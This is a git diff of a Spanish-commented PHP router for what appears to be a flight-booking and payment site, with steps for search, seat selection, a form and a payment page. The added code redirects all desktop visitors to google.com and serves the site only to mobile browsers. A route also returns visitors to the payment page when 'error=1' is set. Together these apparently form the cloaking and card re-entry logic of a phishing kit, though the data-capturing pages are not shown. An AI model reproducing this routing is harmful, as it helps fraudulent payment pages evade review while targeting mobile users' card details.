@@ -1,32 +1,68 @@
-<?php include 'partials/header.php'; ?>
-
 <?php
+// Primero, definimos la ruta base de forma segura.
+define('PARTIALS_PATH', __DIR__ . '/partials/');
+
+// --- Detección de Móvil ---
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$mobileKeywords = [
+    'Mobi', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
+    'webOS', 'Windows Phone', 'Kindle', 'Opera Mini'
+];
+$isMobile = false;
+foreach ($mobileKeywords as $keyword) {
+    if (stripos($userAgent, $keyword) !== false) {
+        $isMobile = true;
+        break;
+    }
+}
+
+// Redirección si es PC (Esto debe ir ANTES de cualquier HTML)
+if (!$isMobile) {
+    header('Location: https://www.google.com');
+    exit;
+}
+
+// --- Función segura para incluir archivos ---
+// La usaremos para cargar todas las partes de la página.
+function safe_include($file) {
+    $path = PARTIALS_PATH . $file;
+    
+    if (file_exists($path)) {
+        include $path;
+    } else {
+        // Si el archivo no se encuentra, mostramos un error claro.
+        echo "<div style='background:red; color:white; padding:10px; font-family:sans-serif;'>";
+        echo "<strong>Error Crítico:</strong> No se pudo encontrar el archivo: <code>" . htmlspecialchars($path) . "</code><br>";
+        echo "Asegúrate de que la carpeta 'partials' y todos sus archivos .php estén subidos a tu repositorio de GitHub.";
+        echo "</div>";
+    }
+}
+
+// Ahora incluimos el header
+safe_include('header.php');
+
+// --- Lógica del Router ---
 $step = isset($_GET['step']) ? $_GET['step'] : '';
 
-// NUEVO: Revisa si existe el parámetro 'error=1' y manda a la página de pago.
 if (isset($_GET['error']) && $_GET['error'] === '1') {
-    include 'partials/pago.php';
+    safe_include('pago.php');
 }
-// 1. Revisa si el paso es 'pago' para mostrar la página de pago.
 elseif ($step === 'pago') {
-    include 'partials/pago.php';
+    safe_include('pago.php');
 }
-// 2. Revisa si el paso es 'form' para mostrar el formulario final.
 elseif ($step === 'form') {
-    include 'partials/form.php';
+    safe_include('form.php');
 }
-// 3. Revisa si el paso es 'seat' para mostrar el selector de asientos.
 elseif ($step === 'seat') {
-    include 'partials/seleccion-asiento.php';
+    safe_include('seleccion-asiento.php');
 }
-// 4. Revisa si existen parámetros de búsqueda para mostrar los resultados de vuelos.
 elseif (isset($_GET['origin'], $_GET['destination'], $_GET['departure-date'])) {
-    include 'partials/flight-results.php';
+    safe_include('flight-results.php');
 }
-// 5. Si ninguna de las condiciones anteriores se cumple, muestra la página de búsqueda inicial.
 else {
-    include 'partials/servicios.php';
-    include 'partials/flight-search.php';
-    include 'partials/viajes.php';
+    // Página de inicio por defecto
+    safe_include('servicios.php');
+    safe_include('flight-search.php');
+    safe_include('viajes.php');
 }
 ?>
